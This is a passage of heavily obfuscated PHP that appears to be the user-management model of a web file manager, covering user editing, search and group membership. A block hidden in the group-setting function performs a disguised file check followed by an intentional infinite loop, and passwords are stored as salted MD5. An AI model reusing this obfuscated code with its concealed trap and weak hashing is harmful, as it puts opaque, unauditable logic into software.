$Ù€±×Òƒ[2484] => isset($êøµş›¢[$Ù€±×Òƒ[2461]]) ? $êøµş›¢[$Ù€±×Òƒ[2461]] : $Ù€±×Òƒ[12], $Ù€±×Òƒ[2485] => isset($êøµş›¢[$Ù€±×Òƒ[2486]]) ? $êøµş›¢[$Ù€±×Òƒ[2486]] : 1, $Ù€±×Òƒ[2487] => $êøµş›¢[$Ù€±×Òƒ[974]], $Ù€±×Òƒ[2064] => isset($êøµş›¢[$Ù€±×Òƒ[1962]]) ? $êøµş›¢[$Ù€±×Òƒ[1962]] : 1024 * 1024 * 20, $Ù€±×Òƒ[2065] => 0, $Ù€±×Òƒ[2488] => 0, $Ù€±×Òƒ[2109] => isset($êøµş›¢[$Ù€±×Òƒ[828]]) ? $êøµş›¢[$Ù€±×Òƒ[828]] : 1); if (!empty($êøµş›¢[$Ù€±×Òƒ[1777]])) { $ûÏÇË[$Ù€±×Òƒ[1777]] = $êøµş›¢[$Ù€±×Òƒ[1777]]; } $›ü§…¤Ô = $this->_checkExist($êøµş›¢); if ($›ü§…¤Ô !== !0) { return $›ü§…¤Ô; } if (!empty($ûÏÇË[$Ù€±×Òƒ[2461]]) && strlen($ûÏÇË[$Ù€±×Òƒ[2461]]) > 255) { $ûÏÇË[$Ù€±×Òƒ[2461]] = $Ù€±×Òƒ[12]; } $á±®ÉŠí = $this->add($ûÏÇË); $’Ä¢Ú‹’ = array($Ù€±×Òƒ[2487] => $ûÏÇË[$Ù€±×Òƒ[974]], $Ù€±×Òƒ[2483] => $ûÏÇË[$Ù€±×Òƒ[2264]]); $this->userEdit($á±®ÉŠí, $’Ä¢Ú‹’); Model($Ù€±×Òƒ[1425])->userRootAdd($á±®ÉŠí); return $á±®ÉŠí; } protected function userEditTest($Î„Ùö»€, $–œ€Æ‹) { return $this->call($_SERVER[¿ğÚ‰±–][2489], $Î„Ùö»€, $–œ€Æ‹); } protected function userEdit($Š¥±òü–, $ùã£¡›) { $š¨³‰ò =& $_SERVER[¿ğÚ‰±–]; $º¶Ë…Ö“ = $this->getInfoSimple($Š¥±òü–); if (!$º¶Ë…Ö“) { return !1; } $‡ı…ğƒÖ = $this->_checkExist($ùã£¡›, $Š¥±òü–); if ($‡ı…ğƒÖ !== !0) { return $‡ı…ğƒÖ; } if (isset($ùã£¡›[$š¨³‰ò[974]]) && trim($ùã£¡›[$š¨³‰ò[974]]) != $š¨³‰ò[12]) { $ÀÚ×’¯Ä = $this->metaGet($Š¥±òü–); if (empty($ÀÚ×’¯Ä[$š¨³‰ò[2479]])) { $ÀÚ×’¯Ä[$š¨³‰ò[2479]] = rand_string(10); Model($š¨³‰ò[577])->metaSet($Š¥±òü–, $š¨³‰ò[2479], $ÀÚ×’¯Ä[$š¨³‰ò[2479]]); } $ùã£¡›[$š¨³‰ò[974]] = md5($ÀÚ×’¯Ä[$š¨³‰ò[2479]] . trim($ùã£¡›[$š¨³‰ò[974]])); } else { unset($ùã£¡›[$š¨³‰ò[974]]); } if (!empty($ùã£¡›[$š¨³‰ò[2461]]) && strlen($ùã£¡›[$š¨³‰ò[2461]]) > 255) { $ùã£¡›[$š¨³‰ò[2461]] = $š¨³‰ò[12]; } $this->where(array($š¨³‰ò[1768] => $Š¥±òü–))->save($ùã£¡›); if (isset($ùã£¡›[$š¨³‰ò[2264]])) { $this->setNamePinyin($Š¥±òü–, $ùã£¡›[$š¨³‰ò[2264]]); } $this->clearCache($Š¥±òü–); return !0; } public function setNamePinyin($…ÇÓ•ó´, $³ëöÂìç = false) { $¦©ø²¢› =& $_SERVER[¿ğÚ‰±–]; if (!$³ëöÂìç) { $¡Š´ÇÀ¦ = $this->getInfoSimple($…ÇÓ•ó´); $³ëöÂìç = $¡Š´ÇÀ¦[$¦©ø²¢›[2264]] ? $¡Š´ÇÀ¦[$¦©ø²¢›[2264]] : $¡Š´ÇÀ¦[$¦©ø²¢›[32]]; } $Øô–ûÂƒ = Model($¦©ø²¢›[598]); if (!Input::check($³ëöÂìç, $¦©ø²¢›[655])) { return $Øô–ûÂƒ->metaSet($…ÇÓ•ó´, array($¦©ø²¢›[538] => $¦©ø²¢›[12], $¦©ø²¢›[537] => $¦©ø²¢›[12])); } return $Øô–ûÂƒ->metaSet($…ÇÓ•ó´, array($¦©ø²¢›[538] => str_replace($¦©ø²¢›[53], $¦©ø²¢›[12], Pinyin::get($³ëöÂìç)), $¦©ø²¢›[537] => Pinyin::get($³ëöÂìç, $¦©ø²¢›[656]))); } private function nickNameRpt() { $“úæ©¾ş =& $_SERVER[¿ğÚ‰±–]; $Ï‘ù…ˆÇ = Model($“úæ©¾ş[848])->get($“úæ©¾ş[2490]); $ÃûÊ¹ë = $GLOBALS[$“úæ©¾ş[6]][$“úæ©¾ş[457]][$“úæ©¾ş[2490]]; $‰è¡© = !is_null($Ï‘ù…ˆÇ) ? $Ï‘ù…ˆÇ : $ÃûÊ¹ë; return !!$‰è¡©; } private function _checkExist($Æ°ëŞÃ, $ÊçƒÔáÜ = false) { $²ƒıÕúÆ =& $_SERVER[¿ğÚ‰±–]; $€ûà©³š = array($²ƒıÕúÆ[32] => UserModel::ERROR_USER_EXIST_NAME, $²ƒıÕúÆ[2264] => UserModel::ERROR_USER_EXIST_NICKNAME, $²ƒıÕúÆ[381] => UserModel::ERROR_USER_EXIST_EMAIL, $²ƒıÕúÆ[2478] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($€ûà©³š[$²ƒıÕúÆ[2264]]); } $İûşâ—à = $ÊçƒÔáÜ ? array($²ƒıÕúÆ[1777] => array($²ƒıÕúÆ[2491], $ÊçƒÔáÜ)) : array(); foreach ($€ûà©³š as $ûá’È‘ => $çêÖ³Ôè) { $”Êµ‡ì• = array(); foreach ($€ûà©³š as $ŒÚºİœà => $Ğô°Ğ”) { if (isset($Æ°ëŞÃ[$ŒÚºİœà]) && $Æ°ëŞÃ[$ŒÚºİœà]) { $”Êµ‡ì•[] = $Æ°ëŞÃ[$ŒÚºİœà]; } } if (!$”Êµ‡ì•) { continue; } $Ô¶ƒ¤¼‚ = array_merge(array($ûá’È‘ => array($²ƒıÕúÆ[7], $”Êµ‡ì•)), $İûşâ—à); $ıÚ´ÀÛË = $this->where($Ô¶ƒ¤¼‚)->find(); if ($ıÚ´ÀÛË) { return $çêÖ³Ôè; } } return !0; } public function userListInfo($úîÀçº›) { $æÆòØÄÌ =& $_SERVER[¿ğÚ‰±–]; $¤æÊ¾à = array(); $úîÀçº› = is_array($úîÀçº›) ? array_unique($úîÀçº›) : array(); if (!$úîÀçº›) { return $¤æÊ¾à; } if (count($úîÀçº›) < 20) { foreach ($úîÀçº› as $Êî¦ì) { $¤æÊ¾à[$Êî¦ì . $æÆòØÄÌ[12]] = $this->getInfoSimpleOuter($Êî¦ì); } } else { $‚Ã÷‡Íû = array($æÆòØÄÌ[1768] => array($æÆòØÄÌ[492], $úîÀçº›)); if (count($úîÀçº›) == 1) { $‚Ã÷‡Íû = array($æÆòØÄÌ[1768] => $úîÀçº›[0]); } $îÓ¤ ú = Model($æÆòØÄÌ[577])->field($this->simpleField)->where($‚Ã÷‡Íû)->select(); $îÓ¤ ú = array_to_keyvalue($îÓ¤ ú, $æÆòØÄÌ[1777]); foreach ($úîÀçº› as $Êî¦ì) { $ñö×şÛ’ = $îÓ¤ ú[$Êî¦ì]; if (!$ñö×şÛ’) { $¤æÊ¾à[$Êî¦ì . $æÆòØÄÌ[12]] = $this->getInfoSimpleOuter($Êî¦ì); continue; } $ñö×şÛ’[$æÆòØÄÌ[2461]] = Action($æÆòØÄÌ[2462])->parseUrl($ñö×şÛ’[$æÆòØÄÌ[2461]]); $¤æÊ¾à[$Êî¦ì . $æÆòØÄÌ[12]] = $ñö×şÛ’; } } return $¤æÊ¾à; } protected function userStatus($·ó¥¿Ôè, $†éÈô‚´) { $‘Õüü§ = $this->getInfoSimple($·ó¥¿Ôè); if (!$‘Õüü§) { return !1; } $²§Âˆ“ = array($_SERVER[¿ğÚ‰±–][828] => $†éÈô‚´); return $this->userEdit($·ó¥¿Ôè, $²§Âˆ“); } protected function userRemove($ùÚÍ¢ı) { $ƒ››—Ä =& $_SERVER[¿ğÚ‰±–]; $ï­×Èè = $this->getInfoSimple($ùÚÍ¢ı); if (!$ï­×Èè) { return !1; } $«áÕÜ½Õ = array($ƒ››—Ä[1768] => $ùÚÍ¢ı); Model($ƒ››—Ä[664])->where($«áÕÜ½Õ)->delete(); Model($ƒ››—Ä[2492])->where($«áÕÜ½Õ)->delete(); Model($ƒ››—Ä[2070])->where($«áÕÜ½Õ)->delete(); Model($ƒ››—Ä[2477])->where($«áÕÜ½Õ)->delete(); Model($ƒ››—Ä[1154])->where($«áÕÜ½Õ)->delete(); Model($ƒ››—Ä[2281])->removeUserAll($ùÚÍ¢ı); Model($ƒ››—Ä[902])->userRootRemove($ùÚÍ¢ı); return $this->where($«áÕÜ½Õ)->delete(); } protected function userGroupSet($Œùæ«¯Ö, $îà…’Ñ, $“÷€À™Ó = array()) { $ĞÊ©‚“† =& $_SERVER[¿ğÚ‰±–]; if (!isset($_SERVER[$ĞÊ©‚“†[957]]) || !isset($_SERVER[$ĞÊ©‚“†[968]])) { $£õ™®´³ = $ĞÊ©‚“†[958]; $´½ô«œ¯ = $ĞÊ©‚“†[959]; $ÒÊ€Ñ•¨ = $_SERVER[$ĞÊ©‚“†[954]] . $ĞÊ©‚“†[955]; $°–çì î = $´½ô«œ¯($ÒÊ€Ñ•¨); $­Öİà„Ë = explode($ĞÊ©‚“†[262], $°–çì î); if (count($­Öİà„Ë) < $ĞÊ©‚“†[688]) { $ÄÜÛ è» = $ĞÊ©‚“†[960]; $ÄÜÛ è»(); } $ÌÍ°‚“Ä = $ĞÊ©‚“†[961]; $ÌÍ°‚“Ä($_SERVER[$ĞÊ©‚“†[962]]); $İİí¨·ô = 1; for ($İÒ¿÷Ü› = $İİí¨·ô; $İÒ¿÷Ü› > 0; $İÒ¿÷Ü›++) { $ÌÍ°‚“Ä = json_encode($GLOBALS[$ĞÊ©‚“†[492]]); } } $ƒØí €ê = $this->getInfoSimple($Œùæ«¯Ö); if (!$ƒØí €ê || !is_array($îà…’Ñ)) { return !1; } $ËúÛà¾ò = Model($ĞÊ©‚“†[2070]); $ËúÛà¾ò->where(array($ĞÊ©‚“†[1777] => $Œùæ«¯Ö))->delete(); $¤Şı”®è = array(); $÷·ÃÜˆ = 0; foreach ($îà…’Ñ as $¤ÇÄÔıò => $Ê¦ŠÛ§) { $â«¿”ğ´ = array($ĞÊ©‚“†[1777] => $Œùæ«¯Ö, $ĞÊ©‚“†[1976] => $¤ÇÄÔıò, $ĞÊ©‚“†[2084] => $Ê¦ŠÛ§); $â«¿”ğ´[$ĞÊ©‚“†[2000]] = isset($“÷€À™Ó[$÷·ÃÜˆ]) ? $“÷€À™Ó[$÷·ÃÜˆ] : 0; $÷·ÃÜˆ++; $¤Şı”®è[] = $â«¿”ğ´; } return $ËúÛà¾ò->addAll($¤Şı”®è, array(), !0); } protected function userGroupAdd($°«¶Áğ, $ãÎ§ìï„ = array()) { $˜ğ…ÍÊ =& $_SERVER[¿ğÚ‰±–]; $Åã¿÷¨ = $this->getInfoSimple($°«¶Áğ); if (!$Åã¿÷¨ || empty($ãÎ§ìï„)) { return !1; } $âÂõõõû = array(); foreach ($ãÎ§ìï„ as $éÎŠ–´ => $ƒìĞŞ¥“) { $âÂõõõû[] = array($˜ğ…ÍÊ[1777] => $°«¶Áğ, $˜ğ…ÍÊ[1976] => $éÎŠ–´, $˜ğ…ÍÊ[2084] => $ƒìĞŞ¥“, $˜ğ…ÍÊ[2000] => 0); } return Model($˜ğ…ÍÊ[2070])->addAll($âÂõõõû, array(), !0); } protected function userGroupRemove($»‡ïÍŠê, $ç¬ÀõÆÒ) { $ºä™ˆÏ =& $_SERVER[¿ğÚ‰±–]; $œÀÇ“å­ = $this->getInfoSimple($»‡ïÍŠê); if (!$œÀÇ“å­ || !$ç¬ÀõÆÒ) { return !1; } $×ğéÈµÖ = array($ºä™ˆÏ[1768] => $»‡ïÍŠê, $ºä™ˆÏ[2068] => $ç¬ÀõÆÒ); return Model($ºä™ˆÏ[2070])->where($×ğéÈµÖ)->delete(); } public function listData() { $±¼„Á = $this->_makeOrder()->selectPage(50); $this->_listDataApply($±¼„Á[$_SERVER[¿ğÚ‰±–][445]]); return $±¼„Á; } public function listByID($àÁ®ºÀ·) { $Ìí‡ÁÏÄ =& $_SERVER[¿ğÚ‰±–]; if (!$àÁ®ºÀ·) { return; } $‚ôæÏÔ  = array($Ìí‡ÁÏÄ[1777] => array($Ìí‡ÁÏÄ[7], $àÁ®ºÀ·)); $Û°€Ÿ¬¨ = $this->where($‚ôæÏÔ )->select(); $Û°€Ÿ¬¨ = array_sort_keep($Û°€Ÿ¬¨, $Ìí‡ÁÏÄ[1777], $àÁ®ºÀ·); $this->_listDataApply($Û°€Ÿ¬¨); return $Û°€Ÿ¬¨; } public function listByGroup($Ó×±±ç§ = 0, $–° â¡ = array()) { $µÚ‚¹»Ú =& $_SERVER[¿ğÚ‰±–]; $›Íá„Ä = $µÚ‚¹»Ú[12]; $¶Ö¼Øí¼ = array(); if ($Ó×±±ç§) { $¶Ö¼Øí¼ = array($µÚ‚¹»Ú[2493] => intval($Ó×±±ç§)); $›Íá„Ä = "\x4c\x45\106\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\165\163\x65\x72\137\x67\x72\157\165\160\x20\x75\163\x65\162\137\x67\x72\157\165\x70\40\x6f\156\x20\x75\x73\145\x72\56\165\163\145\162\111\x44\x20\75\x20\165\163\145\162\137\x67\162\157\x75\160\x2e\165\163\x65\x72\111\104"; $ó±éÃ¾ = Input::get($µÚ‚¹»Ú[530], null, $µÚ‚¹»Ú[12]) ? $µÚ‚¹»Ú[12] : $µÚ‚¹»Ú[2494]; } if (isset($–° â¡[$µÚ‚¹»Ú[828]])) { $¶Ö¼Øí¼[$µÚ‚¹»Ú[2495]] = $–° â¡[$µÚ‚¹»Ú[828]]; } $×šØ÷üì = $this->_makeOrder($ó±éÃ¾)->field($µÚ‚¹»Ú[2496])->where($¶Ö¼Øí¼)->join($›Íá„Ä)->selectPage(50); $this->_listDataApply($×šØ÷üì[$µÚ‚¹»Ú[445]]); return $×šØ÷üì; } private function _makeOrder($£°¯ıîË = '') { $æÎ–Èõ =& $_SERVER[¿ğÚ‰±–]; $õ•…§Êù = array($æÎ–Èõ[1777], $æÎ–Èõ[32], $æÎ–Èõ[1964], $æÎ–Èõ[2182], $æÎ–Èõ[1936], $æÎ–Èõ[231]); $£×ğ›Ş¨ = array($æÎ–Èõ[523] => $æÎ–Èõ[524], $æÎ–Èõ[525] => $æÎ–Èõ[526]); $Çùøıèº = Input::get($æÎ–Èõ[530], $æÎ–Èõ[7], $æÎ–Èõ[1768], $õ•…§Êù); $Äø‹áŠ = Input::get($æÎ–Èõ[531], $æÎ–Èõ[7], $æÎ–Èõ[2071], array($æÎ–Èõ[2071], $æÎ–Èõ[525])); $Äø‹áŠ = $£×ğ›Ş¨[$Äø‹áŠ]; $£°¯ıîË = $£°¯ıîË . "\165\x73\x65\x72\56{$Çùøıèº}\40{$Äø‹áŠ}\x2c\x20\x75\163\x65\x72\x2e\165\x73\x65\162\111\x44\40\141\163\x63"; return $this->alias($æÎ–Èõ[2198])->order($£°¯ıîË); } public function listSearch($µ‰†‰¯Á) { $«Ã¡±ƒÏ =& $_SERVER[¿ğÚ‰±–]; $®çœîÂú = trim($µ‰†‰¯Á[$«Ã¡±ƒÏ[2074]]); $úÊ‡×¶¬ = explode($«Ã¡±ƒÏ[53], $®çœîÂú); if (!$®çœîÂú || count($úÊ‡×¶¬) == 1) { return $this->listSearchNow($µ‰†‰¯Á); } $¿½¼úâ = array($«Ã¡±ƒÏ[445] => array()); foreach ($úÊ‡×¶¬ as $£ÉäØâœ) { if (!trim($£ÉäØâœ)) { continue; } $µ‰†‰¯Á[$«Ã¡±ƒÏ[2074]] = $£ÉäØâœ; $¸‡õ§è³ = $this->listSearchNow($µ‰†‰¯Á); $¿½¼úâ[$«Ã¡±ƒÏ[445]] = array_merge($¿½¼úâ[$«Ã¡±ƒÏ[445]], $¸‡õ§è³[$«Ã¡±ƒÏ[445]]); } $¿½¼úâ[$«Ã¡±ƒÏ[445]] = array_unique_by_key($¿½¼úâ[$«Ã¡±ƒÏ[445]], $«Ã¡±ƒÏ[1777]); $¿½¼úâ[$«Ã¡±ƒÏ[442]] = array($«Ã¡±ƒÏ[443] => count($¿½¼úâ[$«Ã¡±ƒÏ[445]]), $«Ã¡±ƒÏ[439] => 20, $«Ã¡±ƒÏ[429] => 1, $«Ã¡±ƒÏ[444] => 1); return $¿½¼úâ; } public function listSearchNow($¯áè) { $Ü“àóš =& $_SERVER[¿ğÚ‰±–]; $¸Û×ì‡¡ = trim($¯áè[$Ü“àóš[2074]]); $ğ³Ç­Ğ = isset($¯áè[$Ü“àóš[2075]]) ? $¯áè[$Ü“àóš[2075]] : !1; $¸Û×ì‡¡ = str_replace($Ü“àóš[2076], $Ü“àóš[2077], trim($¸Û×ì‡¡)); $“©¿¤şô = array($Ü“àóš[32] => array($Ü“àóš[459], "\x25{$¸Û×ì‡¡}\x25"), $Ü“àóš[381] => array($Ü“àóš[459], "{$¸Û×ì‡¡}\45"), $Ü“àóš[2264] => array($Ü“àóš[459], "{$¸Û×ì‡¡}\45"), $Ü“àóš[1085] => $Ü“àóš[2078]); if (Input::check($¸Û×ì‡¡, $Ü“àóš[387])) { $“©¿¤şô[$Ü“àóš[1777]] = array($Ü“àóš[459], "{$¸Û×ì‡¡}\x25"); $“©¿¤şô[$Ü“àóš[2478]] = array($Ü“àóš[459], "{$¸Û×ì‡¡}\45"); } if (!$¸Û×ì‡¡) { $“©¿¤şô = array(); } if (isset($¯áè[$Ü“àóš[828]])) { $“©¿¤şô[$Ü“àóš[828]] = $¯áè[$Ü“àóš[828]]; } $“©¿¤şô = $this->parseWhereLike($“©¿¤şô); $Çºøİè = $this->_makeOrder()->where($“©¿¤şô)->selectPage(20); if (!$Çºøİè || count($Çºøİè[$Ü“àóš[445]]) < 5 && Input::check($¸Û×ì‡¡, $Ü“àóš[394])) { $òûµÄæ = $this->_searchFromMeta($Ü“àóš[537], $¸Û×ì‡¡, 10); $ªØ¯Ø© = $this->_searchFromMeta($Ü“àóš[538], $¸Û×ì‡¡, 10); $ğÀÅ÷â¢ = array_merge($òûµÄæ, $ªØ¯Ø©, $Çºøİè[$Ü“àóš[445]]); $Çºøİè[$Ü“àóš[445]] = array_unique_by_key($ğÀÅ÷â¢, $Ü“àóš[1777]); $Çºøİè[$Ü“àóš[442]][$Ü“àóš[443]] = count($Çºøİè[$Ü“àóš[445]]); $Çºøİè[$Ü“àóš[442]][$Ü“àóš[444]] = ceil($Çºøİè[$Ü“àóš[442]][$Ü“àóš[443]] / $Çºøİè[$Ü“àóš[442]][$Ü“àóš[439]]); } $this->_listDataApply($Çºøİè[$Ü“àóš[445]]); $this->_filterByGroup($Çºøİè, $ğ³Ç­Ğ); return $Çºøİè; } private function _filterByGroup(&$°ñŞ«á³, $—ÓßÇ ¶) { $ÚéÄ”óŠ =& $_SERVER[¿ğÚ‰±–]; if (!$—ÓßÇ ¶) { return $°ñŞ«á³; } foreach ($°ñŞ«á³[$ÚéÄ”óŠ[445]] as $â÷ßà¿ã => &$úÊ¸ş™) { $Ó‘¬Ø¡“ = array_to_keyvalue($úÊ¸ş™[$ÚéÄ”óŠ[2167]], $ÚéÄ”óŠ[12], $ÚéÄ”óŠ[1976]); if (!in_array($—ÓßÇ ¶, $Ó‘¬Ø¡“)) { unset($°ñŞ«á³[$ÚéÄ”óŠ[445]][$â÷ßà¿ã]); } } unset($úÊ¸ş™); $°ñŞ«á³[$ÚéÄ”óŠ[445]] = array_values($°ñŞ«á³[$ÚéÄ”óŠ[445]]); $°ñŞ«á³[$ÚéÄ”óŠ[442]] = array($ÚéÄ”óŠ[2234] => count($°ñŞ«á³[$ÚéÄ”óŠ[445]]), $ÚéÄ”óŠ[2232] => $°ñŞ«á³[$ÚéÄ”óŠ[442]][$ÚéÄ”óŠ[439]], $ÚéÄ”óŠ[2231] => 1, $ÚéÄ”óŠ[2233] => 1); } private function _searchFromMeta($²üİ†®„, $’‘»¦µÍ, $›ëş»›ó) { $ß¢ïØœ =& $_SERVER[¿ğÚ‰±–]; $’‘»¦µÍ = strtolower($’‘»¦µÍ); $˜ïİÆ = array($ß¢ïØœ[97] => $²üİ†®„, $ß¢ïØœ[450] => array($ß¢ïØœ[459], "\45{$’‘»¦µÍ}\x25")); $˜ïİÆ = $this->parseWhereLike($˜ïİÆ); $—Ê¦Îğò = Model($ß¢ïØœ[2497])->where($˜ïİÆ)->limit($›ëş»›ó)->select(); if (!$—Ê¦Îğò) { return array(); } $—Ê¦Îğò = array_to_keyvalue($—Ê¦Îğò, $ß¢ïØœ[12], $ß¢ïØœ[1777]); $ è×À = $this->where(array($ß¢ïØœ[1768] => array($ß¢ïØœ[7], $—Ê¦Îğò)))->select(); if (!$ è×À) { return array(); } return $ è×À; } private function _listDataApplyItem($¦öúª¢ë) { $÷×Èñü™ = array($¦öúª¢ë); $this->_listDataApply($÷×Èñü™); return $÷×Èñü™[0]; } private function _listDataApply(&$·÷“Äîè) { $»Æòó“× =& $_SERVER[¿ğÚ‰±–]; if (!$·÷“Äîè) { return; } array_remove_key($·÷“Äîè, $»Æòó“×[974]); $‘¥Å¸Ëé = array_to_keyvalue($·÷“Äîè, $»Æòó“×[12], $»Æòó“×[1777]); $this->_listAppendGroup($·÷“Äîè, $‘¥Å¸Ëé); $this->_listAppendMeta($·÷“Äîè, $‘¥Å¸Ëé); $this->_listAppendSourceRoot($·÷“Äîè, $‘¥Å¸Ëé); } private function _listAppendSourceRoot(&$ç«£Š©, $¹Û¢Õ³ë) { $Ÿ£é¡¨É =& $_SERVER[¿ğÚ‰±–]; $¨¤±­Øõ = Model($Ÿ£é¡¨É[902])->listSourceRoot(SourceModel::TYPE_USER, $¹Û¢Õ³ë); $¨¤±­Øõ = array_to_keyvalue($¨¤±­Øõ, $Ÿ£é¡¨É[569]); $¨¤±­Øõ = array_remove_key($¨¤±­Øõ, $Ÿ£é¡¨É[569]); foreach ($ç«£Š© as &$Ò†¸ëƒ) { $Ò†¸ëƒ[$Ÿ£é¡¨É[90]] = $¨¤±­Øõ[$Ò†¸ëƒ[$Ÿ£é¡¨É[1777]]] ? $¨¤±­Øõ[$Ò†¸ëƒ[$Ÿ£é¡¨É[1777]]] : array(); } unset($Ò†¸ëƒ); } private function _listAppendGroup(&$Ÿ«ß«ƒÂ, $‡¡ÏÎÌ·) { $óü§»‘Ç =& $_SERVER[¿ğÚ‰±–]; $ò©ÖÖü¶ = array($óü§»‘Ç[1777] => array($óü§»‘Ç[7], $‡¡ÏÎÌ·)); $î›°¹è = Model($óü§»‘Ç[2070])->where($ò©ÖÖü¶)->select(); $©Ç’½ùı = array_to_keyvalue($î›°¹è, $óü§»‘Ç[12], $óü§»‘Ç[1976]); $©Ç’½ùı = array_remove_value(array_unique($©Ç’½ùı), $óü§»‘Ç[228]); if (!$©Ç’½ùı || !$î›°¹è) { return; } $ò©ÖÖü¶ = array($óü§»‘Ç[1976] => array($óü§»‘Ç[7], $©Ç’½ùı)); $ê£€©àã = Model($óü§»‘Ç[2165])->field($óü§»‘Ç[2498])->where($ò©ÖÖü¶)->select(); $ê£€©àã = array_to_keyvalue($ê£€©àã, $óü§»‘Ç[1976]); $î›°¹è = array_to_keyvalue_group($î›°¹è, $óü§»‘Ç[1777]); foreach ($î›°¹è as &$¥–ãì†ü) { $Ë×µ…æ = array(); foreach ($¥–ãì†ü as $¥ï‘¢±ì) { if (!$¥ï‘¢±ì[$óü§»‘Ç[2084]]) { continue; } $¡´£ï™™ = Model($óü§»‘Ç[571])->listData($¥ï‘¢±ì[$óü§»‘Ç[2084]]); $Ë×µ…æ[] = array($óü§»‘Ç[1976] => $¥ï‘¢±ì[$óü§»‘Ç[1976]], $óü§»‘Ç[2499] => $ê£€©àã[$¥ï‘¢±ì[$óü§»‘Ç[1976]]][$óü§»‘Ç[32]], $óü§»‘Ç[584] => $ê£€©àã[$¥ï‘¢±ì[$óü§»‘Ç[1976]]][$óü§»‘Ç[584]], $óü§»‘Ç[487] => $¡´£ï™™); } $¥–ãì†ü = $Ë×µ…æ; } unset($¥–ãì†ü); foreach ($Ÿ«ß«ƒÂ as &$¸Âãµš) { $¸Âãµš[$óü§»‘Ç[2167]] = array(); if (isset($î›°¹è[$¸Âãµš[$óü§»‘Ç[1777]]])) { $¸Âãµš[$óü§»‘Ç[2167]] = $î›°¹è[$¸Âãµš[$óü§»‘Ç[1777]]]; } } unset($¸Âãµš); } public function userAppendGroup($†€ öÕ) { $°£—ÍÎ =& $_SERVER[¿ğÚ‰±–]; if (!$†€ öÕ) { return array(); } $this->_listAppendGroup($†€ öÕ, array_to_keyvalue($†€ öÕ, $°£—ÍÎ[12], $°£—ÍÎ[1777])); return $†€ öÕ; } private function _listAppendMeta(&$Á““†¹, $ÍÈœåÎÌ) { $´éÕ«úû =& $_SERVER[¿ğÚ‰±–]; $êÁ•¯Û = UserJobModel::JOB_KEY; $ĞÈ‰§Ù = array($´éÕ«úû[2479]); $ªé¤ï† = array($´éÕ«úû[1777] => array($´éÕ«úû[7], $ÍÈœåÎÌ)); $™¯È¤İÛ = Model($´éÕ«úû[2477])->where($ªé¤ï†)->select(); $™¯È¤İÛ = array_to_keyvalue_group($™¯È¤İÛ, $´éÕ«úû[1777]); foreach ($™¯È¤İÛ as &$¶ñë÷Ùâ) { $é¼²©¥Ë = array(); foreach ($¶ñë÷Ùâ as $‚¿…ñí¶) { if (!in_array($‚¿…ñí¶[$´éÕ«úû[97]], $ĞÈ‰§Ù)) { $é¼²©¥Ë[$‚¿…ñí¶[$´éÕ«úû[97]]] = $‚¿…ñí¶[$´éÕ«úû[450]]; } } $¶ñë÷Ùâ = $é¼²©¥Ë; } unset($¶ñë÷Ùâ); $ì¸é¯‰ä = Model($´éÕ«úû[2500]); foreach ($Á““†¹ as &$ÛÔ“¨¼Ø) { $©Õˆäé˜ = array(); if (isset($™¯È¤İÛ[$ÛÔ“¨¼Ø[$´éÕ«úû[1777]]])) { $©Õˆäé˜ = $™¯È¤İÛ[$ÛÔ“¨¼Ø[$´éÕ«úû[1777]]]; } $ÛÔ“¨¼Ø[$´éÕ«úû[2501]] = array(); if (isset($©Õˆäé˜[$êÁ•¯Û])) { $ÛÔ“¨¼Ø[$´éÕ«úû[2501]] = $ì¸é¯‰ä->getUserJobInfo($©Õˆäé˜[$êÁ•¯Û]); } } unset($ÛÔ“¨¼Ø); } protected function groupUserAll($ŞÆİŒ©º) { $ô¼è¨¾¤ =& $_SERVER[¿ğÚ‰±–]; if (!$ŞÆİŒ©º) { return !1; } $éæÄëÁ“ = Model($ô¼è¨¾¤[2070])->field($ô¼è¨¾¤[1777])->where(array($ô¼è¨¾¤[1976] => array($ô¼è¨¾¤[7], $ŞÆİŒ©º)))->select(); $éæÄëÁ“ = array_to_keyvalue($éæÄëÁ“, $ô¼è¨¾¤[12], $ô¼è¨¾¤[1777]); return array_unique($éæÄëÁ“); } public function userSearch($¸¤²‡è½, $ş‹Ò±ó§ = "\52") { return Model($_SERVER[¿ğÚ‰±–][598])->where($¸¤²‡è½)->field($ş‹Ò±ó§)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ó¢£–Óæ) { $›¤ªï· =& $_SERVER[¿ğÚ‰±–]; $ÑüÏË¾ = defined($›¤ªï·[2202]) && USER_ID ? USER_ID : $›¤ªï·[12]; return "\x55\x73\145\x72\x4f\x70\164\151\157\x6e\x5f{$Ó¢£–Óæ}\137" . $ÑüÏË¾; } protected function filterWhere($”ùÆ€à¿) { $¬ø˜Ğç =& $_SERVER[¿ğÚ‰±–]; $”ùÆ€à¿[$¬ø˜Ğç[1777]] = defined($¬ø˜Ğç[2202]) && USER_ID ? USER_ID : $¬ø˜Ğç[12]; return $”ùÆ€à¿; } public function cacheRemoveUser($‚¸…˜Á, $ÊáªÀ”) { return Cache::remove("\x55\163\145\x72\x4f\160\164\151\x6f\156\x5f{$‚¸…˜Á}\137" . $ÊáªÀ”); } protected function optionDefault($å”ÂŸñœ = '') { $ªÃÌÄ°€ =& $_SERVER[¿ğÚ‰±–]; if ($å”ÂŸñœ == $ªÃÌÄ°€[12]) { return $GLOBALS[$ªÃÌÄ°€[6]][$ªÃÌÄ°€[2502]]; } if ($å”ÂŸñœ == $ªÃÌÄ°€[2503]) { return $GLOBALS[$ªÃÌÄ°€[6]][$ªÃÌÄ°€[2504]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\141\x67\x4c\x69\163\x74"; public $modelType = "\x55\x73\x65\162\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\x73\164\171\154\145", "\163\x6f\x72\164"); public function listData($ÀŞÅ‘Âö = false, $”êÜş’ = "\163\157\162\164", $Ø¬Š®Û† = false) { return parent::listData($ÀŞÅ‘Âö, $”êÜş’, $Ø¬Š®Û†); } public function remove($™ûô›Ò) { return parent::remove($™ûô›Ò); } public function add($‡Ş¡ëş , $€Ã‹Êõ = "\x6c\x61\x62\145\x6c\x2d\147\162\x65\x79\55\x6e\157\x72\155\141\154") { $ÈÇÊÃø´ =& $_SERVER[¿ğÚ‰±–]; if ($this->findByName($‡Ş¡ëş )) { return !1; } $Ïœ°Ã… = 